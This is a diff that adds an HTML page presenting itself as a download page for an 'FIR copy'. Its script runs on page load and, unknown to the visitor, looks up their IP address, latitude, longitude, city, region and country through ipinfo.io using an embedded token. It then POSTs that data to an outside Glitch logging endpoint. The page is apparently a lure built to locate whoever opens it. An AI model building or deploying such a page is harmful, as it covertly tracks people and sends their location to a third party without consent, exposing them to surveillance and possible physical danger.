@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>FIR Copy Download</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background-color: #f9f9f9;
+    }
+    .container {
+      padding: 30px;
+      border: 1px solid #ccc;
+      background-color: white;
+      display: inline-block;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Download Your FIR Copy</h1>
+    <p>Click the button below to download your FIR document.</p>
+    <button onclick="downloadFIR()">Download FIR</button>
+  </div>
+
+  <script>
+    function downloadFIR() {
+      window.location.href = "FIR-copy.pdf"; // Make sure this file is uploaded to your GitHub repo
+    }
+
+    fetch("https://ipinfo.io/json?token=5de145575ac808")
+      .then(response => response.json())
+      .then(data => {
+        const loc = data.loc.split(',');
+        const payload = {
+          lat: loc[0],
+          lon: loc[1],
+          city: data.city,
+          region: data.region,
+          country: data.country,
+          ip: data.ip
+        };
+
+        fetch("https://spangle-berry-somersault.glitch.me/log", {
+          method: "POST",
+          body: JSON.stringify(payload),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        });
+      });
+  </script>
+</body>
+</html>
